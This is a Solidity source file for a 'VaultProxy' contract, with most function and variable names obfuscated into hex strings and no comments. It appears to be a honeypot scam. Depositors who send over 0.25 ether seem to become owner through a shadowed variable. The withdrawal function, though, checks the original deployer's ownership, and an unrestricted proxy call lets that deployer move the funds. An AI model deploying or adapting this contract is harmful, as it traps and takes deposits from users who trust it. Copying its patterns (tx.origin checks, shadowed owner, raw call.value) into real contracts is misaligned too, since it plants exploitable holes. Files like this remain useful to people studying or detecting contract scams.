// SPDX-License-Identifier: MIT
pragma solidity ^0.4.23;

contract Proxy  {
    modifier _0x08699a { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x40198d(address _0x136785) public _0x08699a { Owner = _0x136785; }
    function _0xf91d9d(address _0x9c3d67, bytes data) public payable {
        _0x9c3d67.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0x260ca8();
        }
    }

    function _0x260ca8() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x7108eb(uint256 _0x3c2b3c) public _0x08699a {
        if (_0x3c2b3c>0 && Deposits[msg.sender]>=_0x3c2b3c) {
            msg.sender.transfer(_0x3c2b3c);
        }
    }
}